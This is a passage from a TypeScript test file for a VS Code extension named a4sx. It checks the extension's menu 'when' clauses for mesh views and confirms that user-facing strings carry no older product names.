      assert.ok(pkg.contributes.menus.commandPalette.some((m: any) => m.command === cmd && m.when === "false"), cmd);
    }
    const items = pkg.contributes.menus["view/item/context"].filter((m: any) => m.when.startsWith("view == a4sx.meshes"));
    assert.ok(items.filter((m: any) => m.command === ext.CMD_START_IN_MESH).every((m: any) => m.when === "view == a4sx.meshes && viewItem == a4sx.mesh"),
      "no Start on an inactive mesh");
    assert.ok(items.some((m: any) => m.command === ext.CMD_OPEN_MESH && m.when === "view == a4sx.meshes && viewItem =~ /^a4sx\\.mesh(\\.inactive)?$/"),
      "Open in browser on inactive ones too");
  });

  it("user-facing strings say a4sx only", () => {
    const text = JSON.stringify(pkg.contributes) + JSON.stringify(MESH_TEXTS);
    assert.ok(!/agent-mdx|amdx|polaris/i.test(text));
  });
});
